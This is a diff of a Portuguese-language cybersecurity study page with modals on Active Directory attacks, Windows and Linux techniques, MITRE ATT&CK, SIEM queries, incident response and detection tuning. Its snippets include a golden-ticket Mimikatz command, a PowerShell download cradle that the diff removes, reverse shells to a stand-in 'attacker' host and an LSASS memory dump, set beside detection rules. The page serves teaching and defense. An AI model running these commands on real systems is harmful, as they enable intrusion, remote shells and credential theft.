+kerberos::golden /user:Administrator /sid:S-1-5-21-... /krbtgt:hash /ticket:ticket.kirbi
+kerberos::ppt ticket.kirbi
     </div>
   </div>
 </div>
 
+<!-- Active Directory -->
 <div id="ad" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('ad')">×</button>
     <h2>📘 Active Directory</h2>
-    <p>Infraestrutura de autenticação e autorização em redes Windows corporativas.</p>
-
     <h3>Enumeration básica</h3>
-    <div class="code-block">
-# Listar usuários
+    <div class="code">
 net user /domain
-Get-ADUser -Filter * | select Name,Enabled
-
-# Admin users
+Get-ADUser -Filter * | select Name,Enabled,PasswordLastSet
 net group "Domain Admins" /domain
-
-# Domain Controllers
 nltest /dclist:domain.com
     </div>
-
     <h3>Ataques comuns</h3>
     <ul>
-      <li>Kerberoasting</li>
-      <li>ASREPRoasting</li>
-      <li>Pass-the-Hash</li>
-      <li>Golden Ticket</li>
-      <li>Constrained Delegation</li>
-      <li>GPO Abuse</li>
+      <li>Kerberoasting: Crack tickets de contas de serviço</li>
+      <li>ASREPRoasting: Contas sem pré-auth</li>
+      <li>Pass-the-Hash: Usar hashes ao invés de senhas</li>
+      <li>Golden Ticket: Forjar tickets administrativos</li>
+      <li>Constrained Delegation: Escalar privilégios</li>
     </ul>
-
-    <div class="info-box">
-      <strong>💡 Dica:</strong> AD é frequentemente o alvo principal em red teams — comprometer AD = comprometer a rede inteira.
-    </div>
   </div>
 </div>
 
+<!-- Windows -->
 <div id="windows" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('windows')">×</button>
     <h2>🪟 Windows — Ofensivo & Defensivo</h2>
-    <p>Técnicas maliciosas em Windows e como detectá-las.</p>
-
-    <h3>Técnicas ofensivas comuns</h3>
-
-    <h4>Execução de código</h4>
-    <div class="code-block">
+    <h3>Técnicas ofensivas</h3>
+    <div class="code">
 # PowerShell
-powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+powershell.exe -ep bypass -c "IEX(...)"
 
 # CMD
-cmd.exe /c "for /l %i in (1,1,3) do @ping 127.0.0.1"
+cmd.exe /c "..."
 
 # WMI
 wmic process call create "cmd.exe /c beacon.exe"
     </div>
-
-    <h3>Detecção de atividades maliciosas</h3>
+    <h3>O que monitorar (Detecção)</h3>
     <ul>
-      <li>PowerShell.exe -ep bypass</li>
-      <li>cmd.exe /c</li>
-      <li>wmic.exe (suspeito)</li>
-      <li>msiexec.exe, regsvcs.exe (LOLBins)</li>
+      <li>PowerShell.exe -ep bypass (bypass de execution policy)</li>
+      <li>cmd.exe /c (execução silenciosa)</li>
       <li>Process injection (VirtualAllocEx + WriteProcessMemory)</li>
+      <li>LSASS access (credential dumping)</li>
+      <li>Registry modification (RUN keys, scheduled tasks)</li>
     </ul>
-
-    <div class="warning-box">
-      <strong>⚠️ EDR Monitoring:</strong> Unauthorized process creation, registry modification, DLL injection, LSASS access.
-    </div>
   </div>
 </div>
 
+<!-- Linux -->
 <div id="linux" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('linux')">×</button>
     <h2>🐧 Linux — Ofensivo & Defensivo</h2>
-    <p>Técnicas maliciosas em Linux e como detectá-las.</p>
-
-    <h3>Técnicas ofensivas comuns</h3>
-
-    <h4>Execução remota</h4>
-    <div class="code-block">
+    <h3>Técnicas ofensivas</h3>
+    <div class="code">
 # SSH execution
 ssh user@target "whoami"
 
@@ -871,52 +612,37 @@ ssh user@target "whoami"
 bash -i >& /dev/tcp/attacker/4444 0>&1
 nc -e /bin/bash attacker 4444
     </div>
-
-    <h3>Detecção de atividades maliciosas</h3>
-
-    <h4>Monitorar Processos</h4>
-    <div class="code-block">
+    <h3>O que monitorar (Detecção)</h3>
+    <div class="code">
+# Processos com conexões abertas
 netstat -tlnp
 lsof -i -P -n
-ps aux | grep -v grep
-    </div>
 
-    <h4>Monitorar Logs</h4>
-    <div class="code-block">
+# Logs
 tail -f /var/log/auth.log
-grep "Failed password" /var/log/auth.log
 history
-    </div>
 
-    <h4>Monitorar Persistence</h4>
-    <ul>
-      <li>Cron jobs: crontab -l, /etc/cron.d/</li>
-      <li>SSH keys: ~/.ssh/authorized_keys</li>
-      <li>Shell rc files: ~/.bashrc, ~/.zshrc</li>
-      <li>Systemd: /etc/systemd/system/</li>
-    </ul>
+# Persistence (cron, ssh, bashrc, systemd)
+crontab -l
+~/.ssh/authorized_keys
+    </div>
   </div>
 </div>
 
+<!-- MITRE ATT&CK -->
 <div id="mitre" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('mitre')">×</button>
     <h2>🎯 MITRE ATT&CK</h2>
-    <p>Framework que documenta técnicas de adversários conhecidas e comprovadas.</p>
-
-    <h3>O que é</h3>
-    <p>MITRE ATT&CK é uma base de conhecimento curada com técnicas, tácticas e procedimentos (TTPs) usados por adversários reais.</p>
-
     <h3>Estrutura</h3>
     <ul>
-      <li><strong>Tactics:</strong> Objetivo do adversário (ex: Initial Access)</li>
-      <li><strong>Techniques:</strong> Como executar a tática (ex: T1566 Phishing)</li>
-      <li><strong>Sub-techniques:</strong> Variação específica (ex: T1566.001)</li>
-      <li><strong>Procedures:</strong> Implementação específica por malware</li>
+      <li>Tactics: Objetivo do adversário (ex: Initial Access)</li>
+      <li>Techniques: Como executar a tática (ex: T1566 Phishing)</li>
+      <li>Sub-techniques: Variação específica (ex: T1566.001)</li>
+      <li>Procedures: Implementação por malware</li>
     </ul>
-
     <h3>Tácticas principais</h3>
-    <div class="code-block">
+    <div class="code">
 TA0001 - Initial Access
 TA0002 - Execution
 TA0003 - Persistence
@@ -924,76 +650,30 @@ TA0004 - Privilege Escalation
 TA0005 - Defense Evasion
 TA0006 - Credential Access
 TA0008 - Lateral Movement
-TA0009 - Collection
-TA0010 - Exfiltration
     </div>
-
-    <p><a href="https://attack.mitre.org" target="_blank" style="color: var(--blue);">https://attack.mitre.org →</a></p>
+    <p><a href="https://attack.mitre.org" target="_blank" style="color: #3b82f6;">attack.mitre.org</a></p>
   </div>
 </div>
 
-<div id="ttps" class="modal">
-  <div class="modal-content">
-    <button class="modal-close">&times;</button>
-    <h2>📋 TTPs</h2>
-    <p>Padrão de comportamento de um adversário (Tactics, Techniques, Procedures).</p>
-
-    <h3>Definições</h3>
-    <ul>
-      <li><strong>Tactics:</strong> Objetivos de alto nível</li>
-      <li><strong>Techniques:</strong> Como alcançar cada objetivo</li>
-      <li><strong>Procedures:</strong> Implementação específica</li>
-    </ul>
-
-    <h3>Exemplo: Operação estruturada</h3>
-    <div class="code-block">
-Tactic: Initial Access
-  Technique: Spearphishing
-  Procedure: Email malicioso com anexo
-
-Tactic: Execution
-  Technique: User Execution
-  Procedure: Vítima abre anexo
-
-Tactic: Privilege Escalation
-  Technique: Kernel Exploit
-  Procedure: CVE-2009-2846 (Windows)
-    </div>
-
-    <div class="info-box">
-      <strong>💡 Prioridade defensiva:</strong> TTPs comuns (Phishing, Pass-the-Hash) devem ter detecção específica.
-    </div>
-  </div>
-</div>
-
+<!-- SIEM -->
 <div id="siem" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('siem')">×</button>
     <h2>📊 SIEM / Log Analysis</h2>
-    <p>Coleta e análise centralizada de logs para detecção de ameaças.</p>
-
     <h3>SIEMs comuns</h3>
     <ul>
-      <li><strong>Splunk:</strong> Líder em mercado</li>
-      <li><strong>ELK Stack:</strong> Open-source</li>
-      <li><strong>ArcSight:</strong> HPE</li>
-      <li><strong>QRadar:</strong> IBM</li>
+      <li>Splunk: Líder em mercado</li>
+      <li>ELK Stack: Open-source (Elasticsearch, Logstash, Kibana)</li>
+      <li>ArcSight: HPE</li>
+      <li>QRadar: IBM</li>
     </ul>
-
-    <h3>ELK Stack básico</h3>
-    <div class="code-block">
-docker-compose up -d
-curl -X GET "localhost:9200/_search"
-http://localhost:5601 (Kibana UI)
-    </div>
-
     <h3>Splunk queries</h3>
-    <div class="code-block">
-# Falha de autenticação
+    <div class="code">
+# Eventos de falha de autenticação
 index=windows EventCode=4625 | stats count by Account_Name
 
 # PowerShell suspeito
-index=windows sourcetype="WinEventLog:PowerShell" (IEX OR DownloadString)
+index=windows (IEX OR DownloadString OR WebClient)
 
 # Lateral movement (PsExec)
 index=windows EventCode=7045 ImagePath="*psexec*"
@@ -1001,24 +681,22 @@ index=windows EventCode=7045 ImagePath="*psexec*"
   </div>
 </div>
 
-<div id="incident" class="modal">
+<!-- Incident Response -->
+<div id="ir" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('ir')">×</button>
     <h2>🚨 Incident Response</h2>
-    <p>Processo de responder e investigar incidentes de segurança.</p>
-
     <h3>Fases do IR</h3>
-    <ol>
-      <li><strong>Preparação:</strong> Setup ferramentas, treino</li>
-      <li><strong>Detecção & Análise:</strong> Identificar incidente</li>
-      <li><strong>Contenção:</strong> Parar spread, isolar</li>
-      <li><strong>Eradicação:</strong> Remover ameaça</li>
-      <li><strong>Recuperação:</strong> Restaurar sistemas</li>
-      <li><strong>Post-Incident:</strong> Lições aprendidas</li>
-    </ol>
-
+    <div class="code">
+1. Preparação (setup ferramentas, treino)
+2. Detecção & Análise (identificar incidente)
+3. Contenção (parar spread, isolar sistemas)
+4. Eradicação (remover ameaça, patch vulns)
+5. Recuperação (restaurar sistemas)
+6. Post-Incident (lições aprendidas)
+    </div>
     <h3>Ferramentas de Forensics</h3>
-    <div class="code-block">
+    <div class="code">
 # Memory dump
 procdump -accepteula -ma lsass.exe lsass.dmp
 
@@ -1032,25 +710,22 @@ dd if=/dev/sda of=/mnt/backup/disk.img bs=4M
   </div>
 </div>
 
-<div id="threat-detection" class="modal">
+<!-- Threat Detection -->
+<div id="detection" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('detection')">×</button>
     <h2>🔴 Threat Detection</h2>
-    <p>Capacidade de identificar atividades maliciosas em tempo real.</p>
-
     <h3>Tipos de detecção</h3>
     <ul>
-      <li><strong>Signature-based:</strong> Pattern matching</li>
-      <li><strong>Anomaly-based:</strong> Desvio do normal</li>
-      <li><strong>Behavioral:</strong> Análise de cadeia de atividades</li>
+      <li>Signature-based: Pattern matching conhecido</li>
+      <li>Anomaly-based: Desvio do comportamento normal</li>
+      <li>Behavioral: Análise de cadeia de atividades</li>
     </ul>
-
     <h3>Sigma rules (genéricas)</h3>
-    <div class="code-block">
+    <div class="code">
 title: PowerShell execution from temp
 logsource:
   product: windows
-  category: process_creation
 detection:
   selection:
     Image|endswith: 'powershell.exe'
@@ -1059,92 +734,60 @@ detection:
       - 'Downloads'
   condition: selection
     </div>
-
-    <h3>YARA rules (malware)</h3>
-    <div class="code-block">
-rule MalwareExample {
-  strings:
-    $s1 = "cmd.exe /c" wide
-    $hex = { 4D 5A 90 00 }
-  condition: all of them
-}
-    </div>
   </div>
 </div>
 
-<div id="detection-tuning" class="modal">
+<!-- Detection Rule Tuning -->
+<div id="tuning" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('tuning')">×</button>
     <h2>⚙️ Detection Rule Tuning</h2>
-    <p>Otimizar regras de detecção para maximizar efetividade e minimizar falsos positivos.</p>
-
-    <h3>Estratégia de tuning</h3>
-
-    <h4>1. Whitelisting</h4>
-    <p>Adicionar processos legítimos que trigam falsos positivos.</p>
-
-    <h4>2. Correlação</h4>
-    <p>Combinar múltiplos indicadores ao invés de alertar em um único evento.</p>
-
-    <h4>3. Contextualização</h4>
-    <ul>
-      <li>Horário (behavior anormal fora de horas?)</li>
-      <li>Usuário (admin ou comum?)</li>
-      <li>Localização (IP corporativo?)</li>
-      <li>Histórico (foi detectado antes?)</li>
-    </ul>
-
-    <h3>Métrica: TP vs FP</h3>
-    <div class="code-block">
+    <h3>Estratégia</h3>
+    <div class="code">
+1. Whitelisting (adicionar processos legítimos)
+2. Correlação (combinar múltiplos indicadores)
+3. Contextualização (horário, usuário, localização)
+4. Métricas (TP vs FP)
+    </div>
+    <h3>Métricas</h3>
+    <div class="code">
 Precision = TP / (TP + FP)
 Recall = TP / (TP + FN)
 F-score = 2 * (Precision * Recall) / (Precision + Recall)
-    </div>
-
-    <div class="info-box">
-      <strong>💡 Regra 80/20:</strong> 20% das regras capturam 80% dos verdadeiros ataques.
     </div>
   </div>
 </div>
 
 <script>
-  // Função para abrir modal
-  document.querySelectorAll('.skill-btn').forEach(btn => {
-    btn.addEventListener('click', function() {
-      const modalId = this.getAttribute('data-modal');
-      if (modalId) {
-        const modal = document.getElementById(modalId);
-        if (modal) {
-          modal.classList.add('active');
-        }
-      }
-    });
-  });
+function open_modal(modalId) {
+  const modal = document.getElementById(modalId);
+  if (modal) {
+    modal.classList.add('active');
+  }
+}
 
-  // Função para fechar modal
-  document.querySelectorAll('.modal-close').forEach(btn => {
-    btn.addEventListener('click', function() {
-      this.closest('.modal').classList.remove('active');
-    });
-  });
+function close_modal(modalId) {
+  const modal = document.getElementById(modalId);
+  if (modal) {
+    modal.classList.remove('active');
+  }
+}
 
-  // Fechar modal ao clicar fora
-  document.querySelectorAll('.modal').forEach(modal => {
-    modal.addEventListener('click', function(e) {
-      if (e.target === this) {
-        this.classList.remove('active');
-      }
-    });
-  });
-
-  // Fechar com ESC
-  document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') {
-      document.querySelectorAll('.modal.active').forEach(modal => {
-        modal.classList.remove('active');
-      });
+// Fechar ao clicar fora
+document.querySelectorAll('.modal').forEach(modal => {
+  modal.addEventListener('click', function(e) {
+    if (e.target === this) {
+      this.classList.remove('active');
     }
   });
+});
+
+// Fechar com ESC
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') {
+    document.querySelectorAll('.modal.active').forEach(m => m.classList.remove('active'));
+  }
+});
 </script>
 
 </body>
